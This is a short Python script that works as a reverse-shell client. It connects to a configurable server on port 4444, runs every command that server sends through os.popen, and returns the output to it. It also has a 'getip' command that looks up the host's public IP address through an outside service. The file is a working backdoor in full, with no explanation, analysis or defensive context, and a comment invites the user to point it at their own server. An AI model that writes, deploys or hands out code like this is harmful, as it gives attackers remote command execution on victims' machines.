import socket
import os

SERVER_IP = '127.0.0.1'  # Change to your server's IP if needed
SERVER_PORT = 4444

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, SERVER_PORT))

try:
    while True:
        command = client.recv(4096).decode()
        if not command:
            break
        if command.lower() == "exit":
            break
        elif command.lower() == "getip":
            ip = os.popen('curl -s api.ipify.org').read().strip()
            if not ip:
                ip = "Could not retrieve IP."
            client.sendall(ip.encode())
            continue  # Skip running os.popen(command) for getip
        output = os.popen(command).read()
        if not output:
            output = "Command executed, but no output."
        client.sendall(output.encode())
except Exception as e:
    print("Connection closed:", e)
finally:
    client.close()
    print("Disconnected from server.")